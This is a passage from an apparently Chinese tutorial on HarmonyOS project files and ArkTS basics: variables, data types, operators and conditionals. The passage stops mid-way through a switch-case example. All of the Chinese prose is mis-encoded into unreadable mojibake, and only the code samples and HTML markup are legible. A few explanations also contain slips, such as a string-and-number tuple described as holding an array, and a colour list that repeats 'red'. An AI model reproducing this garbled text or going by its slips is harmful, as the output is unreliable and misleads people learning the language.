<li><strong>src &gt; main &gt; resources</strong>ï¼šç”¨äºå­˜æ”¾åº”ç”¨/æœåŠ¡æ‰€ç”¨åˆ°çš„èµ„æºæ–‡ä»¶ï¼Œå¦‚å›¾å½¢ã€å¤šåª’ä½“ã€å­—ç¬¦ä¸²ã€å¸ƒå±€æ–‡ä»¶ç­‰ã€‚å…³äºèµ„æºæ–‡ä»¶ï¼Œè¯¦è§<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V5%2Fresource-categories-and-access-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/resource-categories-and-access-V5" ref="nofollow noopener noreferrer">èµ„æºåˆ†ç±»ä¸è®¿é—®</a>ã€‚</li>
<li><strong>src &gt; main &gt; module.json5</strong>ï¼šæ¨¡å—é…ç½®æ–‡ä»¶ã€‚ä¸»è¦åŒ…å«HAPåŒ…çš„é…ç½®ä¿¡æ¯ã€åº”ç”¨/æœåŠ¡åœ¨å…·ä½“è®¾å¤‡ä¸Šçš„é…ç½®ä¿¡æ¯ä»¥åŠåº”ç”¨/æœåŠ¡çš„å…¨å±€é…ç½®ä¿¡æ¯ã€‚å…·ä½“çš„é…ç½®æ–‡ä»¶è¯´æ˜ï¼Œè¯¦è§<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V5%2Fmodule-configuration-file-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/module-configuration-file-V5" ref="nofollow noopener noreferrer">module.json5é…ç½®æ–‡ä»¶</a>ã€‚</li>
<li><strong>build-profile.json5</strong>ï¼šå½“å‰çš„æ¨¡å—ä¿¡æ¯ ã€ç¼–è¯‘ä¿¡æ¯é…ç½®é¡¹ï¼ŒåŒ…æ‹¬buildOptionã€targetsé…ç½®ç­‰ã€‚</li>
<li><strong>hvigorfile.ts</strong>ï¼šæ¨¡å—çº§ç¼–è¯‘æ„å»ºä»»åŠ¡è„šæœ¬ã€‚</li>
<li><strong>obfuscation-rules.txt</strong>ï¼šæ··æ·†è§„åˆ™æ–‡ä»¶ã€‚æ··æ·†å¼€å¯åï¼Œåœ¨ä½¿ç”¨Releaseæ¨¡å¼è¿›è¡Œç¼–è¯‘æ—¶ï¼Œä¼šå¯¹ä»£ç è¿›è¡Œç¼–è¯‘ã€æ··æ·†åŠå‹ç¼©å¤„ç†ï¼Œä¿æŠ¤ä»£ç èµ„äº§ã€‚è¯¦è§<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V5%2Fide-build-obfuscation-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/ide-build-obfuscation-V5" ref="nofollow noopener noreferrer">å¼€å¯ä»£ç æ··æ·†</a>ã€‚</li>
<li><strong>oh-package.json5</strong>ï¼šç”¨æ¥æè¿°åŒ…åã€ç‰ˆæœ¬ã€å…¥å£æ–‡ä»¶ï¼ˆç±»å‹å£°æ˜æ–‡ä»¶ï¼‰å’Œä¾èµ–é¡¹ç­‰ä¿¡æ¯ã€‚</li>
</ul>
</li>
<li>
<p><strong>oh_modules</strong>ï¼šç”¨äºå­˜æ”¾ä¸‰æ–¹åº“ä¾èµ–ä¿¡æ¯ã€‚</p>
</li>
<li>
<p><strong>build-profile.json5</strong>ï¼šå·¥ç¨‹çº§é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç­¾åsigningConfigsã€äº§å“é…ç½®productsç­‰ã€‚å…¶ä¸­productsä¸­å¯é…ç½®å½“å‰è¿è¡Œç¯å¢ƒï¼Œé»˜è®¤ä¸ºHarmonyOSã€‚</p>
</li>
<li>
<p><strong>hvigorfile.ts</strong>ï¼šå·¥ç¨‹çº§ç¼–è¯‘æ„å»ºä»»åŠ¡è„šæœ¬ã€‚</p>
</li>
<li>
<p><strong>oh-package.json5</strong>ï¼šä¸»è¦ç”¨æ¥æè¿°å…¨å±€é…ç½®ï¼Œå¦‚ï¼šä¾èµ–è¦†ç›–ï¼ˆoverridesï¼‰ã€ä¾èµ–å…³ç³»é‡å†™ï¼ˆoverrideDependencyMapï¼‰å’Œå‚æ•°åŒ–é…ç½®ï¼ˆparameterFileï¼‰ç­‰</p>
</li>
</ul>
</li>
</ul>
<p>åˆ°è¿™ï¼é¸¿è’™å¼€å‘ç¯å¢ƒå·²ç»æ­å»ºæˆåŠŸã€‚ç°åœ¨å¼€å§‹ä»‹ç»ArkTSè¯­è¨€</p>
<h3 data-id="heading-3">1.2 ArkTSè¯­è¨€ä»‹ç»</h3>
<p>ArkTSæ˜¯é¸¿è’™ç”Ÿæ€çš„åº”ç”¨å¼€å‘è¯­è¨€ã€‚å®ƒåœ¨ä¿æŒTypeScriptï¼ˆç®€ç§°TSï¼‰åŸºæœ¬è¯­æ³•é£æ ¼çš„åŸºç¡€ä¸Šï¼Œè¿›ä¸€æ­¥é€šè¿‡è§„èŒƒå¼ºåŒ–é™æ€æ£€æŸ¥å’Œåˆ†æï¼Œä½¿å¾—åœ¨ç¨‹åºè¿è¡Œä¹‹å‰çš„å¼€å‘æœŸèƒ½æ£€æµ‹æ›´å¤šé”™è¯¯ï¼Œæå‡ä»£ç å¥å£®æ€§ï¼Œå¹¶å®ç°æ›´å¥½çš„è¿è¡Œæ€§èƒ½ã€‚åŒæ—¶ï¼Œæä¾›äº†å£°æ˜å¼UIèŒƒå¼ã€çŠ¶æ€ç®¡ç†æ”¯æŒç­‰ç›¸åº”çš„èƒ½åŠ›ï¼Œè®©å¼€å‘è€…å¯ä»¥ä»¥æ›´ç®€æ´ã€æ›´è‡ªç„¶çš„æ–¹å¼å¼€å‘é«˜æ€§èƒ½åº”ç”¨</p>
<p>è¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€å§‹ä¸Šæ‰‹å§ï¼</p>
<h2 data-id="heading-4">2ã€ArkTSè¯­æ³•è®²è§£</h2>
<h3 data-id="heading-5">2.1 ArkTSå£°æ˜</h3>
<p>ArkTSé€šè¿‡å£°æ˜å¼•å…¥å˜é‡ã€å¸¸é‡ã€å‡½æ•°å’Œç±»å‹</p>
<h4 data-id="heading-6">2.1.1 å˜é‡å£°æ˜</h4>
<p>ä»¥å…³é”®å­—<strong>letå¼€å¤´</strong>çš„å£°æ˜å¼•å…¥å˜é‡ï¼Œè¯¥å˜é‡åœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´å¯ä»¥å…·æœ‰ä¸åŒçš„å€¼ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let hi: string = 'hello';
hi = 'hello, world';
</code></pre>
<h4 data-id="heading-7">2.1.2 å¸¸é‡å£°æ˜</h4>
<p>ä»¥å…³é”®å­—constå¼€å¤´çš„å£°æ˜å¼•å…¥åªè¯»å¸¸é‡ï¼Œè¯¥å¸¸é‡åªèƒ½è¢«èµ‹å€¼ä¸€æ¬¡ï¼Œå¦‚æœå¼ºåˆ¶é‡æ–°èµ‹å€¼å°†ä¼šé€ æˆç¼–è¯‘æ—¶é”™è¯¯ï¼</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">const hello: string = 'hello';
</code></pre>
<h4 data-id="heading-8">2.1.3 è‡ªåŠ¨ç±»å‹æ¨æ–­</h4>
<p>å› ä¸ºArkTSæ˜¯ä¸€ç§é™æ€ç±»å‹è¯­è¨€ï¼Œå› æ­¤æ‰€æœ‰æ•°æ®ç±»å‹å¿…é¡»åœ¨ç¼–è¯‘æ—¶ç¡®å®šã€‚</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœä¸€ä¸ªå˜é‡æˆ–å¸¸é‡çš„å£°æ˜åŒ…å«äº†åˆå§‹å€¼ï¼Œé‚£ä¹ˆå¼€å‘è€…å°±ä¸éœ€è¦æ˜¾å¼æŒ‡å®šå…¶ç±»å‹ã€‚ArkTSè§„èŒƒä¸­åˆ—ä¸¾äº†æ‰€æœ‰å…è®¸è‡ªåŠ¨æ¨æ–­ç±»å‹çš„åœºæ™¯ã€‚</p>
<p>ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œä¸¤æ¡å£°æ˜è¯­å¥éƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œä¸¤ä¸ªå˜é‡éƒ½æ˜¯stringç±»å‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let hi1: string = 'hello';
let hi2 = 'hello, world';
</code></pre>
<h3 data-id="heading-9">2.2 ArkTSåŸºç¡€æ•°æ®ç±»å‹</h3>
<h4 data-id="heading-10">2.2.1 numberç±»å‹</h4>
<p>ArkTSæä¾›numberç±»å‹</p>
<ul>
<li>numberç”¨äºè¡¨ç¤ºæ•´æ•°å’Œæµ®ç‚¹æ•°</li>
<li>æ”¯æŒå¤§éƒ¨åˆ†çš„ç®—æœ¯è¿ç®—</li>
<li>æ•°å­—çš„èŒƒå›´å’Œè¡Œä¸ºä¸JavaScriptç±»ä¼¼</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let n1 = 3.14;
let n2 = 3.141592;
let n3 = .5;
let n4 = 1e2;

function factorial(n: number): number {
  if (n &lt;= 1) {
    return 1;
  }
  return n * factorial(n - 1);
}

factorial(n1)  //  7.660344000000002 
factorial(n2)  //  7.680640444893748 
factorial(n3)  //  1 
factorial(n4)  //  9.33262154439441e+157 
</code></pre>
<p>æ³¨æ„ï¼š<strong>numberç±»å‹åœ¨è¡¨ç¤ºå¤§æ•´æ•°æ—¶ä¼šé€ æˆç²¾åº¦ä¸¢å¤±ã€‚åœ¨å¼€å‘æ—¶å¯ä»¥æŒ‰éœ€ä½¿ç”¨BigIntç±»å‹æ¥ç¡®ä¿ç²¾åº¦</strong>ï¼š</p>
<p>BigIntç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let bigIntger: BigInt = BigInt('999999999999999999999999999999999999999999999999999999999999');
console.log('bigIntger' + bigIntger.toString());
</code></pre>
<h4 data-id="heading-11">2.2.2 booleanç±»å‹</h4>
<ul>
<li>booleanç±»å‹ç”±trueå’Œfalseä¸¤ä¸ªé€»è¾‘å€¼ç»„æˆã€‚</li>
<li>é€šå¸¸åœ¨æ¡ä»¶è¯­å¥ä¸­ä½¿ç”¨booleanç±»å‹çš„å˜é‡ï¼š</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let isDone: boolean = false;

if (isDone) {
  console.log ('Done!');
}
</code></pre>
<h4 data-id="heading-12">2.2.3 stringç±»å‹</h4>
<ul>
<li>
<p>stringä»£è¡¨å­—ç¬¦åºåˆ—ï¼›å¯ä»¥ä½¿ç”¨è½¬ä¹‰å­—ç¬¦æ¥è¡¨ç¤ºå­—ç¬¦ã€‚</p>
</li>
<li>
<p>å­—ç¬¦ä¸²å¯ä»¥ç”± å•å¼•å· ' æˆ–è€… åŒå¼•å· " ç›¸äº’åŒ…è£¹é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ç»„æˆã€‚</p>
</li>
<li>
<p>å­—ç¬¦ä¸²è¿˜å¯ä»¥ç”¨åå‘å•å¼•å· ` åŠ ä¸Š ${å˜é‡} ç»„åˆä½¿ç”¨</p>
</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let s1 = 'Hello, world!\n';
let s2 = 'this is a string';
let a = 'Success';
let s3 = `The result is ${a}`;
</code></pre>
<h4 data-id="heading-13">2.2.4 voidç±»å‹</h4>
<ul>
<li>é€šå¸¸ç”¨äºå‡½æ•°çš„è¿”å›ç±»å‹ï¼Œè¡¨ç¤ºè¯¥å‡½æ•°ä¸è¿”å›ä»»ä½•åª</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class Class&lt;T&gt; {
  //...
}
let instance: Class &lt;void&gt;
</code></pre>
<h4 data-id="heading-14">2.2.5 null å’Œ underfined</h4>
<ul>
<li>Nullè¡¨ç¤ºä¸€ä¸ªæ˜ç¡®çš„ç©ºå€¼</li>
<li>Undefined è¡¨ç¤ºä¸€ä¸ªå˜é‡æœªè¢«èµ‹å€¼æˆ–æœªåˆå§‹åŒ–æ—¶çš„é»˜è®¤çŠ¶æ€</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">
let unknownValue: null = null;
let uninitializedValue: undefined = undefined
</code></pre>
<h3 data-id="heading-15">2.3 ArkTSå¤åˆæ•°æ®ç±»å‹</h3>
<h4 data-id="heading-16">2.3.1 Arrayï¼ˆæ•°ç»„ï¼‰</h4>
<ul>
<li>array ç”¨äºå­˜å‚¨å¤šä¸ªå€¼ã€‚å¯ä»¥æ˜¯åŒä¸€ç±»å‹æˆ–ä¸åŒç±»å‹çš„å€¼ï¼ˆæ ¹æ®å®šä¹‰çš„ç±»å‹ï¼‰</li>
<li>æ”¯æŒå¸¸è§çš„æ•°ç»„æ“ä½œï¼Œå¦‚éå†ã€ç´¢å¼•è®¿é—®ã€æ•°ç»„æ–¹æ³•ç­‰ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let numbers:number[]=[1,2,3,4,5];
let names:string[]=["Alice","Bob","Charlie"];
</code></pre>
<h4 data-id="heading-17">2.3.2 Tupleï¼ˆå…ƒç»„ï¼‰</h4>
<ul>
<li>Tupleæ˜¯ä¸€ç§<strong>å›ºå®šå¤§å°ã€å·²çŸ¥ç±»å‹çš„æ•°ç»„</strong>ã€‚æ¯ä¸ªå…ƒç´ å¯ä»¥æœ‰ä¸åŒç±»å‹</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let person:[string,number]=["Bob",12];
</code></pre>
<ul>
<li>å…ƒç»„å…è®¸å­˜å‚¨ä¸åŒç±»å‹çš„æ•°æ®ï¼Œä¾‹å¦‚ï¼š<code>[string,number]</code>ä»£è¡¨ä¸€ä¸ªåŒ…å«å­—ç¬¦ä¸²å’Œæ•°ç»„çš„å…ƒç»„</li>
</ul>
<h4 data-id="heading-18">2.3.3 Objectï¼ˆå¯¹è±¡ï¼‰</h4>
<ul>
<li>Objectç±»å‹æ˜¯æ‰€æœ‰å¼•ç”¨ç±»å‹çš„åŸºç±»å‹ã€‚</li>
<li>ä»»ä½•å€¼ï¼ŒåŒ…æ‹¬åŸºæœ¬ç±»å‹çš„å€¼ï¼Œéƒ½å¯ä»¥ç›´æ¥è¢«èµ‹ç»™Objectç±»å‹çš„å˜é‡ï¼ˆåŸºæœ¬ç±»å‹å€¼ä¼šè¢«è‡ªåŠ¨è£…ç®±ï¼‰</li>
<li>Objectç±»å‹ç”¨äºè¡¨ç¤ºé™¤åŸºæœ¬ç±»å‹å¤–çš„ç±»å‹</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let o1: Object = 'Alice';
let o2: Object = ['a','b'];
let o3: Object = 1;
</code></pre>
<h4 data-id="heading-19">2.3.4 Functionï¼ˆå‡½æ•°ç±»å‹ï¼‰</h4>
<ul>
<li>Functionç±»å‹ç”¨äºè¡¨ç¤ºå‡½æ•°çš„ç±»å‹ï¼Œå¯ä»¥æŒ‡å®šå‡½æ•°çš„å‚æ•°ç±»å‹å’Œè¿”å›å€¼ç±»å‹</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let add: (x: number, y: number) =&gt; number = (x, y) =&gt; x + y;
let greet: (name: string) =&gt; void = (name) =&gt; console.log('hello,'+name);

add(12,23)
greet("Bob")
</code></pre>
<h4 data-id="heading-20">2.3.5 Literal Typesï¼ˆå­—é¢é‡ç±»å‹ï¼‰</h4>
<ul>
<li>å­—é¢é‡ç±»å‹ç”¨äºè¡¨ç¤ºæŸä¸ªå…·ä½“çš„å€¼ï¼Œè€Œä¸æ˜¯å€¼çš„ç±»å‹</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let color: "red" | "green" | "blue" = "red"
let status: 1 | 2 | 3 = 2
</code></pre>
<p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ<code>color</code> å°±åªèƒ½æ˜¯ <code>red</code>ã€<code>green</code>ã€<code>red</code>è¿™ä¸‰è€…ä¸­çš„å…¶ä¸­ä¹‹ä¸€ï¼Œ<code>status</code>åŒç†ã€‚</p>
<h4 data-id="heading-21">2.3.6 Enumï¼ˆæšä¸¾ï¼‰</h4>
<ul>
<li>Enum æ˜¯ä¸€ç»„æœ‰åç§°çš„å¸¸æ•°å€¼ï¼Œé€šå¸¸ç”¨äºè¡¨ç¤ºä¸€ç»„å›ºå®šçš„é€‰é¡¹æˆ–çŠ¶æ€</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">enum Direction {
  up = 1,
  down = 2,
  left = 3,
  right = 4
}


let direction = Direction.up

</code></pre>
<h4 data-id="heading-22">2.3.7 Unionï¼ˆè”åˆç±»å‹ï¼‰</h4>
<ul>
<li>Unionç±»å‹ï¼Œå³è”åˆç±»å‹ï¼Œæ˜¯ç”±å¤šä¸ªç±»å‹ç»„åˆæˆçš„å¼•ç”¨ç±»å‹</li>
<li>è”åˆç±»å‹åŒ…å«äº†å˜é‡å¯èƒ½çš„æ‰€æœ‰ç±»å‹</li>
</ul>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let value:string|number="hello"
value=30
// å¯ä»¥å°†ç±»å‹ä¸ºè”åˆç±»å‹çš„å˜é‡èµ‹å€¼ä¸ºä»»ä½•ç»„æˆç±»å‹çš„æœ‰æ•ˆå€¼
</code></pre>
<h4 data-id="heading-23">2.3.8 Aliasesï¼ˆåŒ¿åç±»å‹ï¼‰</h4>
<ul>
<li>Aliasesç±»å‹ä¸ºåŒ¿åç±»å‹ï¼ˆå¦‚æ•°ç»„ã€å‡½æ•°ã€å¯¹è±¡å­—é¢é‡æˆ–è”åˆç±»å‹ï¼‰æä¾›åç§°ï¼Œæˆ–ä¸ºå·²å®šä¹‰çš„ç±»å‹æä¾›æ›¿ä»£åç§°</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">type Matrix = number[][];
const gameBoard: Matrix = [
  [1, 0],
  [0, 1]
];
</code></pre>
<h3 data-id="heading-24">2.4 è¿ç®—ç¬¦</h3>
<h4 data-id="heading-25">2.4.1 ç®—æœ¯è¿ç®—ç¬¦</h4>





































<table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>+</code></td><td>åŠ æ³•</td></tr><tr><td><code>-</code></td><td>å‡æ³•</td></tr><tr><td><code>*</code></td><td>ä¹˜æ³•</td></tr><tr><td><code>/</code></td><td>é™¤æ³•</td></tr><tr><td><code>%</code></td><td>å–ä½™ï¼ˆæ¨¡ï¼‰</td></tr><tr><td><code>++</code></td><td>è‡ªå¢</td></tr><tr><td><code>--</code></td><td>è‡ªå‡</td></tr></tbody></table>
<h4 data-id="heading-26">2.4.2 èµ‹å€¼è¿ç®—ç¬¦</h4>
<p>èµ‹å€¼è¿ç®—ç¬¦ç”¨äº<strong>å°†å³è¾¹çš„å€¼èµ‹ç»™å·¦è¾¹çš„å˜é‡</strong></p>













<table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>=</code></td><td>èµ‹å€¼ï¼Œä½¿ç”¨æ–¹å¼å¦‚ <code>x=y</code></td></tr></tbody></table>
<h5 data-id="heading-27">2.4.2.1 å¤åˆèµ‹å€¼è¿ç®—ç¬¦</h5>
<p>å¤åˆèµ‹å€¼è¿ç®—ç¬¦å°†<strong>èµ‹å€¼è¿ç®—ç¬¦ä¸è¿ç®—ç¬¦ç»„åˆåœ¨ä¸€èµ·</strong></p>





















































<table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>+=</code></td><td>åŠ èµ‹å€¼ï¼Œä½¿ç”¨æ–¹å¼å¦‚ <code>x += y</code>ï¼Œç­‰ä»·äº <code>x = x + y</code></td></tr><tr><td><code>-=</code></td><td>å‡èµ‹å€¼ï¼Œä½¿ç”¨æ–¹å¼å¦‚ <code>x -= y</code>ï¼Œç­‰ä»·äº <code>x = x - y</code></td></tr><tr><td><code>*=</code></td><td>ä¹˜èµ‹å€¼ï¼Œä½¿ç”¨æ–¹å¼å¦‚ <code>x *= y</code>ï¼Œç­‰ä»·äº <code>x = x * y</code></td></tr><tr><td><code>/=</code></td><td>é™¤èµ‹å€¼ï¼Œä½¿ç”¨æ–¹å¼å¦‚ <code>x /= y</code>ï¼Œç­‰ä»·äº <code>x = x / y</code></td></tr><tr><td><code>%=</code></td><td>å–ä½™èµ‹å€¼ï¼Œä½¿ç”¨æ–¹å¼å¦‚ <code>x %= y</code>ï¼Œç­‰ä»·äº <code>x = x % y</code></td></tr><tr><td><code>&lt;&lt;=</code></td><td>å·¦ç§»èµ‹å€¼ï¼Œç¤ºä¾‹æ•ˆæœï¼š3 &lt;&lt;= 2 â†’ 12</td></tr><tr><td><code>&gt;&gt;=</code></td><td>å³ç§»èµ‹å€¼ï¼Œç¤ºä¾‹æ•ˆæœï¼š12 &gt;&gt;= 2 â†’ 3</td></tr><tr><td><code>&gt;&gt;&gt;=</code></td><td>æ— ç¬¦å·å³ç§»èµ‹å€¼ï¼Œç¤ºä¾‹æ•ˆæœï¼š-8 &gt;&gt;&gt;= 1 â†’ å¤§æ­£æ•°</td></tr><tr><td><code>&amp;=</code></td><td>æŒ‰ä½ä¸èµ‹å€¼ï¼Œä¸¤ä½éƒ½ä¸º1æ‰ä¸º1,ç¤ºä¾‹æ•ˆæœï¼š6 &amp;= 3 â†’ 2</td></tr><tr><td><code>|=</code></td><td>æŒ‰ä½æˆ–èµ‹å€¼ï¼Œæœ‰ 1 å°± 1ï¼Œç¤ºä¾‹æ•ˆæœï¼š<code>6 |= 3 â†’ 7</code></td></tr><tr><td><code>^=</code></td><td>æŒ‰ä½å¼‚æˆ–èµ‹å€¼ï¼Œç›¸åŒä¸º 0ï¼Œä¸åŒä¸º 1,ç¤ºä¾‹æ•ˆæœï¼š6 ^= 3 â†’ 5</td></tr></tbody></table>
<h4 data-id="heading-28">2.4.3 ä½è¿ç®—ç¬¦</h4>
<p>ä½è¿ç®—ç¬¦ç”¨äºå¯¹æ•´æ•°å€¼è¿›è¡Œä½çº§åˆ«çš„æ“ä½œ</p>





































<table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>&amp;</code></td><td>æŒ‰ä½ä¸ï¼ˆä¸¤ä½éƒ½ä¸º 1 æ‰ä¸º 1ï¼‰</td></tr><tr><td><code>|</code></td><td>æŒ‰ä½æˆ–ï¼ˆæœ‰ 1 å³ä¸º 1ï¼‰</td></tr><tr><td><code>^</code></td><td>æŒ‰ä½å¼‚æˆ–ï¼ˆç›¸åŒä¸º 0ï¼Œä¸åŒä¸º 1ï¼‰</td></tr><tr><td><code>~</code></td><td>æŒ‰ä½éï¼ˆæŒ‰ä½å–åï¼Œ0 å˜ 1ï¼Œ1 å˜ 0ï¼‰</td></tr><tr><td><code>&lt;&lt;</code></td><td>å·¦ç§»ï¼ˆå·¦ç§» n ä½ï¼Œç›¸å½“äºä¹˜ä»¥ 2<sup>n</sup>ï¼‰</td></tr><tr><td><code>&gt;&gt;</code></td><td>å³ç§»ï¼ˆå³ç§» n ä½ï¼Œä¿ç•™ç¬¦å·ä½ï¼Œç›¸å½“äºé™¤ä»¥ 2<sup>n</sup> å¹¶å‘ä¸‹å–æ•´ï¼‰</td></tr><tr><td><code>&gt;&gt;&gt;</code></td><td>æ— ç¬¦å·å³ç§»ï¼ˆå³ç§»åé«˜ä½è¡¥ 0ï¼Œä¸ä¿ç•™ç¬¦å·ä½ï¼‰</td></tr></tbody></table>
<h4 data-id="heading-29">2.4.4 æ¯”è¾ƒè¿ç®—ç¬¦</h4>
<p>æ¯”è¾ƒè¿ç®—ç¬¦ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼ï¼Œå¹¶è¿”å›å¸ƒå°”å€¼ï¼ˆtrueæˆ–falseï¼‰</p>









































<table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>===</code></td><td>å¦‚æœä¸¤ä¸ªæ“ä½œæ•°ä¸¥æ ¼ç›¸ç­‰ï¼ˆå¯¹äºä¸åŒç±»å‹çš„æ“ä½œæ•°è®¤ä¸ºæ˜¯ä¸ç›¸ç­‰çš„ï¼‰ï¼Œåˆ™è¿”å›trueã€‚</td></tr><tr><td><code>!==</code></td><td>å¦‚æœä¸¤ä¸ªæ“ä½œæ•°ä¸¥æ ¼ä¸ç›¸ç­‰ï¼ˆå¯¹äºä¸åŒç±»å‹çš„æ“ä½œæ•°è®¤ä¸ºæ˜¯ä¸ç›¸ç­‰çš„ï¼‰ï¼Œåˆ™è¿”å›trueã€‚</td></tr><tr><td><code>==</code></td><td>å¦‚æœä¸¤ä¸ªæ“ä½œæ•°ç›¸ç­‰ï¼Œåˆ™è¿”å›trueã€‚</td></tr><tr><td><code>!=</code></td><td>å¦‚æœä¸¤ä¸ªæ“ä½œæ•°ä¸ç›¸ç­‰ï¼Œåˆ™è¿”å›trueã€‚</td></tr><tr><td><code>&gt;</code></td><td>å¦‚æœå·¦æ“ä½œæ•°å¤§äºå³æ“ä½œæ•°ï¼Œåˆ™è¿”å›trueã€‚</td></tr><tr><td><code>&gt;=</code></td><td>å¦‚æœå·¦æ“ä½œæ•°å¤§äºæˆ–ç­‰äºå³æ“ä½œæ•°ï¼Œåˆ™è¿”å›trueã€‚</td></tr><tr><td><code>&lt;</code></td><td>å¦‚æœå·¦æ“ä½œæ•°å°äºå³æ“ä½œæ•°ï¼Œåˆ™è¿”å›trueã€‚</td></tr><tr><td><code>&lt;=</code></td><td>å¦‚æœå·¦æ“ä½œæ•°å°äºæˆ–ç­‰äºå³æ“ä½œæ•°ï¼Œåˆ™è¿”å›trueã€‚</td></tr></tbody></table>
<h4 data-id="heading-30">2.4.5 é€»è¾‘è¿ç®—ç¬¦</h4>
<p>é€»è¾‘è¿ç®—ç¬¦ç”¨äºå¤„ç†å¸ƒå°”å€¼çš„è¿ç®—</p>





















<table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>&amp;&amp;</code></td><td>é€»è¾‘ä¸ï¼ˆANDï¼‰</td></tr><tr><td><code>||</code></td><td>é€»è¾‘æˆ– ï¼ˆORï¼‰</td></tr><tr><td><code>!</code></td><td>é€»è¾‘éï¼ˆNOTï¼‰</td></tr></tbody></table>
<h4 data-id="heading-31">2.4.6 ç±»å‹è¿ç®—ç¬¦</h4>
<p>ç±»å‹è¿ç®—ç¬¦ç”¨äºè¿›è¡Œç±»å‹æ£€æŸ¥å’Œç±»å‹è½¬æ¢</p>















<table><thead><tr><th>è¿ç®—ç¬¦</th><th>ç¤ºä¾‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>instanceof</code></td><td><code>obj instanceof className</code></td><td>å¦‚æœobjæ˜¯classNameç±»æˆ–å…¶å­ç±»çš„å®ä¾‹ï¼Œåˆ™è¿”å›å€¼ä¸ºtrueï¼›å¦åˆ™ï¼Œè¿”å›å€¼ä¸ºfalse</td></tr></tbody></table>
<h3 data-id="heading-32">2.5 è¡¨è¾¾å¼</h3>
<h4 data-id="heading-33">2.5.1 if-else è¯­å¥</h4>
<ul>
<li>if-elseè¯­å¥æ ¹æ®é€»è¾‘æ¡ä»¶æ‰§è¡Œä¸åŒçš„è¯­å¥åœºæ™¯ã€‚å½“æ¡ä»¶ä¸ºçœŸæ—¶ï¼Œæ‰§è¡Œä¸ºçœŸçš„è¯­å¥ï¼Œå¦åˆ™æ‰§è¡Œå¦ä¸€ç»„è¯­å¥</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">if (condition1) {
  //æ‰§è¡Œæ»¡è¶³ condition1ä¸ºçœŸï¼ˆå³ä¸ºtrueï¼‰ çš„è¯­å¥
} else {
  //æ‰§è¡Œæ»¡è¶³ condition1ä¸ºçœŸï¼ˆå³ä¸ºfalseï¼‰ çš„è¯­å¥
}
</code></pre>
<h4 data-id="heading-34">2.5.2 switch-caseè¯­å¥</h4>
<ul>
<li>switch-caseè¯­å¥æ ¹æ®ä¸åŒçš„caseé€‰é¡¹ï¼Œå½“æ»¡è¶³caseé€‰é¡¹æ¡ä»¶æ—¶ï¼Œåˆ™æ‰§è¡Œå¯¹åº”è¯­å¥</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">
switch (people) {
  case teacher:
    //å¦‚æœpeople æ˜¯ teacherï¼Œåˆ™æ‰§è¡Œè¿™é‡Œé¢è¯­å¥
    break
  case student:
    //å¦‚æœpeople æ˜¯ studentï¼Œåˆ™æ‰§è¡Œè¿™é‡Œé¢è¯­å¥
    break
  case worker:
